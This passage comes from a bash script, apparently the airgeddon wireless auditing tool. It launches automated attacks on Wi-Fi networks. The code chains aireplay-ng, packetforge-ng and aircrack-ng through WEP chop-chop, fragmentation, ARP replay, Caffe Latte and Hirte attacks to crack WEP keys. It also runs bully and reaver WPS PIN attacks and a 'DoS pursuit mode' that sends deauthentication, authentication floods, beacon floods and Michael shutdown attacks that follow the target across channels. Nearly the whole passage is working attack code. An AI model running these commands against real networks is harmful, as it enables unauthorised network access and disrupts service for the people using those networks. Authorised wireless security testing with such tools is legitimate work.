			local tmux_color_cmd
			if [ -n "\${3}" ]; then
				tmux_color_cmd="bg=#000000 fg=\${3}"
			else
				tmux_color_cmd="bg=#000000"
			fi

			tmux setw -t "\${window_name}" window-style "\${tmux_color_cmd}"
			tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
		}

		#Function to capture PID of a process started inside tmux and setting it to a global variable
		#shellcheck disable=SC2009
		function get_tmux_process_id() {

			local process_pid
			local process_cmd_line
			process_cmd_line=\$(echo "\${1}" | tr -d '"')
			while [ -z "\${process_pid}" ]; do
				process_pid=\$(ps --no-headers aux | grep "\${process_cmd_line}" | grep -v "grep \${process_cmd_line}" | awk '{print \$2}')
			done
			global_process_pid="\${process_pid}"
		}

		#Function to kill tmux windows using window name
		function kill_tmux_window_by_name() {

			if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				tmux kill-window -t "${session_name}:\${1}" 2> /dev/null
			fi
		}

		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
		mkdir "${tmpdir}${wepdir}" > /dev/null 2>&1
		#shellcheck disable=SC2164
		cd "${tmpdir}${wepdir}" > /dev/null 2>&1

		#Execute wep chop-chop attack on its different phases
		function wep_chopchop_attack() {

			case "\${wep_chopchop_phase}" in
				1)
					if grep "Now you can build a packet" "${tmpdir}${wepdir}chopchop_output.txt" > /dev/null 2>&1; then
						wep_chopchop_phase=2
					else
						wep_chopchop_phase1_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_chopchop_phase1_pid}$" 2> /dev/null)
						if [[ "\${wep_chopchop_launched}" -eq 0 ]] || [[ -z "\${wep_chopchop_phase1_pid_alive}" ]]; then
							wep_chopchop_launched=1
							manage_output "+j -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (1/3)\"" "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" "Chop-Chop Attack (1/3)"

							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
								get_tmux_process_id "aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface}"
								wep_chopchop_phase1_pid="\${global_process_pid}"
								global_process_pid=""
							else
								wep_chopchop_phase1_pid="\$!"
							fi

							wep_script_processes+=("\${wep_chopchop_phase1_pid}")
						fi
					fi
				;;
				2)
					kill_tmux_window_by_name "Chop-Chop Attack (1/3)"
					manage_output "+j -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" "Chop-Chop Attack (2/3)"

					if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
						wep_chopchop_phase2_pid="\$!"
					fi

					wep_script_processes+=("\${wep_chopchop_phase2_pid}")
					wep_chopchop_phase=3
					;;
				3)
					wep_chopchop_phase2_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_chopchop_phase2_pid}$" 2> /dev/null)
					if [[ -z "\${wep_chopchop_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}chopchop.cap" ]]; then
						kill_tmux_window_by_name "Chop-Chop Attack (2/3)"
						manage_output "-hold -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"

						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
							get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
							wep_script_processes+=("\${global_process_pid}")
							global_process_pid=""
						else
							wep_script_processes+=("\$!")
						fi

						wep_chopchop_phase=4
					fi
				;;
			esac
			write_wep_processes
		}

		#Execute wep fragmentation attack on its different phases
		function wep_fragmentation_attack() {

			case "\${wep_fragmentation_phase}" in
				1)
					if grep "Now you can build a packet" "${tmpdir}${wepdir}fragmentation_output.txt" > /dev/null 2>&1; then
						wep_fragmentation_phase=2
					else
						wep_fragmentation_phase1_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_fragmentation_phase1_pid}$" 2> /dev/null)
						if [[ "\${wep_fragmentation_launched}" -eq 0 ]] || [[ -z "\${wep_fragmentation_phase1_pid_alive}" ]]; then
							wep_fragmentation_launched=1
							manage_output "+j -bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (1/3)\"" "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" "Fragmentation Attack (1/3)"

							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
								get_tmux_process_id "aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface}"
								wep_fragmentation_phase1_pid="\${global_process_pid}"
								global_process_pid=""
							else
								wep_fragmentation_phase1_pid="\$!"
							fi

							wep_script_processes+=("\${wep_fragmentation_phase1_pid}")
						fi
					fi
				;;
				2)
					kill_tmux_window_by_name "Fragmentation Attack (1/3)"
					manage_output "+j -bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" "Fragmentation Attack (2/3)"

					if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
						wep_fragmentation_phase2_pid="\$!"
					fi

					wep_fragmentation_phase=3
					wep_script_processes+=("\${wep_fragmentation_phase2_pid}")
				;;
				3)
					wep_fragmentation_phase2_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_fragmentation_phase2_pid}$" 2> /dev/null)
					if [[ -z "\${wep_fragmentation_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}fragmentation.cap" ]]; then
						kill_tmux_window_by_name "Fragmentation Attack (2/3)"
						manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" "Fragmentation Attack (3/3)"

						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
							get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}"
							wep_script_processes+=("\${global_process_pid}")
							global_process_pid=""
						else
							wep_script_processes+=("\$!")
						fi

						wep_fragmentation_phase=4
					fi
				;;
			esac
			write_wep_processes
		}

		#Write on a file the id of the WEP attack processes
		function write_wep_processes() {

			if [ ! -f "${tmpdir}${wepdir}${wep_processes_file}" ]; then
				touch "${tmpdir}${wepdir}${wep_processes_file}" > /dev/null 2>&1
			fi
			path_to_process_file="${tmpdir}${wepdir}${wep_processes_file}"

			for item in "\${wep_script_processes[@]}"; do
				if ! grep -E "^\${item}$" "\${path_to_process_file}" > /dev/null 2>&1; then
					echo "\${item}" >> "${tmpdir}${wepdir}${wep_processes_file}"
				fi
			done
		}

		wep_script_processes=()

		manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g5_topright_window} -T \"Capturing WEP Data\"" "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}" "Capturing WEP Data" "active"
		if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
			get_tmux_process_id "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}"
			wep_script_capture_pid="\${global_process_pid}"
			global_process_pid=""
		else
			wep_script_capture_pid="\$!"
		fi

		wep_script_processes+=("\${wep_script_capture_pid}")
		write_wep_processes

		wep_to_be_launched_only_once=0
		wep_fakeauth_pid=""
		wep_aircrack_launched=0
		current_ivs=0
		wep_chopchop_launched=0
		wep_chopchop_phase=1
		wep_fragmentation_launched=0
		wep_fragmentation_phase=1

		while true; do
			wep_capture_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_script_capture_pid}$" 2> /dev/null)
			wep_fakeauth_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_fakeauth_pid}$" 2> /dev/null)

			if [[ -n "\${wep_capture_pid_alive}" ]] && [[ -z "\${wep_fakeauth_pid_alive}" ]]; then
				manage_output "+j -bg \"#000000\" -fg \"#00FF00\" -geometry ${g5_left1} -T \"Fake Auth\"" "aireplay-ng -1 3 -o 1 -q 10 -a ${bssid} -h ${current_mac} ${interface}" "Fake Auth"
				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng -1 3 -o 1 -q 10 -a ${bssid} -h ${current_mac} ${interface}"
					wep_fakeauth_pid="\${global_process_pid}"
					global_process_pid=""
				else
					wep_fakeauth_pid="\$!"
				fi

				wep_script_processes+=("\${wep_fakeauth_pid}")
				write_wep_processes
				sleep 2
			fi

			if [ "\${wep_to_be_launched_only_once}" -eq 0 ]; then
				wep_to_be_launched_only_once=1

				manage_output "+j -bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_left2} -T \"Arp Broadcast Injection\"" "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" "Arp Broadcast Injection"
				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}"
					wep_script_processes+=("\${global_process_pid}")
					global_process_pid=""
				else
					wep_script_processes+=(\$!)
				fi

				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g5_left3} -T \"Arp Request Replay\"" "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" "Arp Request Replay"
				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}"
					wep_script_processes+=("\${global_process_pid}")
					global_process_pid=""
				else
					wep_script_processes+=(\$!)
				fi

				manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g5_left4} -T \"Caffe Latte Attack\"" "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Caffe Latte Attack"
				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}"
					wep_script_processes+=("\${global_process_pid}")
					global_process_pid=""
				else
					wep_script_processes+=(\$!)
				fi

				manage_output "+j -bg \"#000000\" -fg \"#D3D3D3\" -geometry ${g5_left5} -T \"Hirte Attack\"" "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Hirte Attack"
				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}"
					wep_script_processes+=("\${global_process_pid}")
					global_process_pid=""
				else
					wep_script_processes+=("\$!")
				fi

				write_wep_processes
			fi

			if [ "\${wep_fragmentation_phase}" -lt 4 ]; then
				wep_fragmentation_attack
			fi

			if [ "\${wep_chopchop_phase}" -lt 4 ]; then
				wep_chopchop_attack
			fi

			ivs_cmd="grep WEP ${tmpdir}${wep_data}*.csv --exclude=*kismet* | head -n 1 "
			ivs_cmd+="| awk '{print \\\$11}' FS=',' | sed 's/ //g'"

			current_ivs=\$(eval "\${ivs_cmd}")
			if [[ "\${current_ivs}" -ge 5000 ]] && [[ "\${wep_aircrack_launched}" -eq 0 ]]; then
				wep_aircrack_launched=1

				manage_output "+j -bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_bottomright_window} -T \"Decrypting WEP Key\"" "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" "Decrypting WEP Key" "active"
				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
					get_tmux_process_id "aircrack-ng \"${tmpdir}${wep_data}\".*cap -l \"${tmpdir}${wepdir}wepkey.txt\""
					wep_aircrack_pid="\${global_process_pid}"
					global_process_pid=""
				else
					wep_aircrack_pid="\$!"
				fi

				wep_script_processes+=("\${wep_aircrack_pid}")
				write_wep_processes
			fi

			wep_aircrack_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_aircrack_pid}$" 2> /dev/null)
			if [[ -z "\${wep_aircrack_pid_alive}" ]] && [[ "\${wep_aircrack_launched}" -eq 1 ]]; then
				break
			elif [[ -z "\${wep_capture_pid_alive}" ]]; then
				break
			fi
		done
	EOF
}

#Execute wps custom pin bully attack
function exec_wps_custom_pin_bully_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "bully" "custompin"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS custom pin bully attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin bully attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin bully attack"
}

#Execute wps custom pin reaver attack
function exec_wps_custom_pin_reaver_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "custompin"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS custom pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin reaver attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin reaver attack"
}

#Execute bully pixie dust attack
function exec_bully_pixiewps_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "bully" "pixiedust"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS bully pixie dust attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully pixie dust attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully pixie dust attack"
}

#Execute reaver pixie dust attack
function exec_reaver_pixiewps_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "pixiedust"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS reaver pixie dust attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver pixie dust attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver pixie dust attack"
}

#Execute wps bruteforce pin bully attack
function exec_wps_bruteforce_pin_bully_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "bully" "bruteforce"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS bruteforce pin bully attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin bully attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin bully attack"
}

#Execute wps bruteforce pin reaver attack
function exec_wps_bruteforce_pin_reaver_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "bruteforce"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS bruteforce pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin reaver attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin reaver attack"
}

#Execute wps pin database bully attack
function exec_wps_pin_database_bully_attack() {

	debug_print

	wps_pin_database_prerequisites

	set_wps_attack_script "bully" "pindb"

	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS bully known pins database based attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully known pins database based attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully known pins database based attack"
}

#Execute wps pin database reaver attack
function exec_wps_pin_database_reaver_attack() {

	debug_print

	wps_pin_database_prerequisites

	set_wps_attack_script "reaver" "pindb"

	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS reaver known pins database based attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver known pins database based attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver known pins database based attack"
}

#Execute wps null pin reaver attack
function exec_reaver_nullpin_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "nullpin"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS null pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS null pin reaver attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS null pin reaver attack"
}

#Execute DoS pursuit mode attack
function launch_dos_pursuit_mode_attack() {

	debug_print

	rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
	rm -rf "${tmpdir}clts.csv" > /dev/null 2>&1
	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1

	if [[ -n "${2}" ]] && [[ "${2}" = "relaunch" ]]; then
		if [[ -z "${enterprise_mode}" ]] && [[ -z "${et_mode}" ]]; then
			echo
			language_strings "${language}" 707 "yellow"
		else
			echo
			language_strings "${language}" 507 "yellow"
		fi
	fi

	recalculate_windows_sizes
	case "${1}" in
		"${mdk_command} amok attack")
			dos_delay=1
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"aireplay deauth attack")
			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
			dos_delay=3
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"auth dos attack")
			dos_delay=1
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"beacon flood attack")
			dos_delay=1
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"wids / wips / wds confusion attack")
			dos_delay=10
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"michael shutdown attack")
			dos_delay=1
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${interface}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"${mdk_command}")
			dos_delay=1
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" "Deauth (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"Aireplay")
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
			iw "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			dos_delay=3
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "Deauth (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"Auth DoS")
			dos_delay=10
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "Deauth (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
	esac

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		dos_pursuit_mode_attack_pid=$!
	fi
	dos_pursuit_mode_pids+=("${dos_pursuit_mode_attack_pid}")

	if [ "${channel}" -gt 14 ]; then
		if [ "${interface_pursuit_mode_scan}" = "${interface}" ]; then
			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				echo
				language_strings "${language}" 515 "red"
				kill_dos_pursuit_mode_processes
				language_strings "${language}" 115 "read"
				return 1
			else
				airodump_band_modifier="abg"
			fi
		else
			if [ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				echo
				language_strings "${language}" 515 "red"
				kill_dos_pursuit_mode_processes
				language_strings "${language}" 115 "read"
				return 1
			else
				airodump_band_modifier="abg"
			fi
		fi
	else
		if [ "${interface_pursuit_mode_scan}" = "${interface}" ]; then
			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				airodump_band_modifier="bg"
			else
				airodump_band_modifier="abg"
			fi
		else
			if [ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				airodump_band_modifier="bg"
			else
				airodump_band_modifier="abg"
			fi
		fi
	fi

	sleep "${dos_delay}"
	airodump-ng -w "${tmpdir}dos_pm" "${interface_pursuit_mode_scan}" --band "${airodump_band_modifier}" > /dev/null 2>&1 &
	dos_pursuit_mode_scan_pid=$!
	dos_pursuit_mode_pids+=("${dos_pursuit_mode_scan_pid}")

	if [[ -n "${2}" ]] && [[ "${2}" = "relaunch" ]]; then
		if [[ -n "${enterprise_mode}" ]] || [[ -n "${et_mode}" ]]; then
			launch_fake_ap
		fi
	fi

	local processes_file
	processes_file="${tmpdir}${et_processesfile}"
	for item in "${dos_pursuit_mode_pids[@]}"; do
		echo "${item}" >> "${processes_file}"
	done
}

#Parse and control pids for DoS pursuit mode attack
pid_control_pursuit_mode() {

	debug_print

	rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
	echo "${channel}" > "${tmpdir}${channelfile}"

	while true; do
		sleep 5
		if grep "${bssid}" "${tmpdir}dos_pm-01.csv" > /dev/null 2>&1; then
			readarray -t DOS_PM_LINES_TO_PARSE < <(cat < "${tmpdir}dos_pm-01.csv" 2> /dev/null)

			for item in "${DOS_PM_LINES_TO_PARSE[@]}"; do
				if [[ "${item}" =~ ${bssid} ]]; then
					dos_pm_current_channel=$(echo "${item}" | awk -F "," '{print $4}' | sed 's/^[ ^t]*//')

					if [[ "${dos_pm_current_channel}" =~ ^([0-9]+)$ ]] && [[ "${BASH_REMATCH[1]}" -ne 0 ]] && [[ "${BASH_REMATCH[1]}" -ne "${channel}" ]]; then
						channel="${dos_pm_current_channel}"
						rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
						echo "${channel}" > "${tmpdir}${channelfile}"

						if [ -n "${enterprise_mode}" ]; then
							sed -ri "s:(channel)=([0-9]{1,3}):\1=${channel}:" "${tmpdir}${hostapd_wpe_file}" 2> /dev/null
						elif [ -n "${et_mode}" ]; then
							sed -ri "s:(channel)=([0-9]{1,3}):\1=${channel}:" "${tmpdir}${hostapd_file}" 2> /dev/null
						fi

						kill_dos_pursuit_mode_processes
						launch_dos_pursuit_mode_attack "${1}" "relaunch"
					fi
				fi
			done
		fi

		dos_attack_alive=$(ps uax | awk '{print $2}' | grep -E "^${dos_pursuit_mode_attack_pid}$" 2> /dev/null)
		if [ -z "${dos_attack_alive}" ]; then
			break
		fi
	done

	kill_dos_pursuit_mode_processes
}

#Execute mdk deauth DoS attack
function exec_mdkdeauth() {

	debug_print

	echo
	language_strings "${language}" 89 "title"
	language_strings "${language}" 32 "green"

	rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
	echo "${bssid}" > "${tmpdir}bl.txt"

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "${mdk_command} amok attack" "first_time"
		pid_control_pursuit_mode "${mdk_command} amok attack"
	else
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
